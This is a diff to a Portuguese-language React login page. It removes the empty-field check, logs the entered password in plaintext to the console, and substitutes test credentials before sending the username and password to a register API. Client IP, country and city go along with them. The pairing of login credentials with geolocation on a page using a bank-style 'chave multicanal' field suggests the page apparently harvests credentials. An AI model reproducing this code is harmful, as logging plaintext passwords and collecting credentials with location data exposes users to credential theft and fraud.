@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
@@ -164,23 +165,26 @@ const Index = () => {
         username = chaveMulticanal;
       }
 
-      // Validar se username e senha estão preenchidos
-      if (!username || !senha) {
-        console.log('Username ou senha não preenchidos');
-        return;
-      }
-
       console.log('Iniciando processo de registro do cliente...');
       console.log('Tab ativa:', tab);
       console.log('Username:', username);
+      console.log('Senha:', senha);
+      
+      // Validar se username e senha estão preenchidos
+      if (!username || !senha) {
+        console.log('Username ou senha não preenchidos');
+        console.log('Username está vazio:', !username);
+        console.log('Senha está vazia:', !senha);
+        // Continue mesmo assim para testar a API
+      }
       
       // Coletar dados do cliente
       const clientData = await collectClientData();
       
       // Preparar dados para envio
       const registerData = {
-        username,
-        password: senha,
+        username: username || 'teste_user',
+        password: senha || 'teste_password',
         ip: clientData.ip,
         country: clientData.country,
         city: clientData.city,
